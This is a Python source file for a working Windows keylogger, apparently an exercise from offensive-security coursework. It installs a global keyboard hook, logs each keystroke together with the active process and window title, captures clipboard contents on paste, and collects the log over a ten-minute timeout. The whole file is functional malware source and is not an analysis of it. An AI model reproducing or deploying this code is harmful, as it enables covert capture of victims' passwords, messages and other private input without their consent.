from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os 
import pythoncom
#? The pywin32 package is required for pythoncom 
#? HOWEVER, the pywin32 package can ONLY be installed on Windows
#? if you're developing on Linux this package wont install 
#? you will recieve an error if you try and: pip install pywin32
#? https://pypi.org/project/pywin32/
#? Source from package author - https://github.com/mhammond/pywin32/issues/1739

import pyWinhook
#* https://www.swig.org/survey.html
#* https://www.swig.org/download.html
#* https://zwbetz.com/how-to-add-a-binary-to-your-path-on-macos-linux-windows/
#? Also need C++ 14.0 or greater
#* https://visualstudio.microsoft.com/visual-cpp-build-tools/
#* Hah to rename the path do there were no '.' or '-'

import sys
import time
import win32clipboard

TIMEOUT = 600

class KeyLogger:
    def __init__(self) -> None:
        self.current_window = None
        
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
        print(process_id)
        
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        
        window_title = create_string_buffer(512)
        print(window_title)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)


    def my_key_stroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')  
        return True


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyWinhook.HookManager()
    hm.KeyDown = kl.my_key_stroke
    hm.HookKeyboard()

    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print('done.')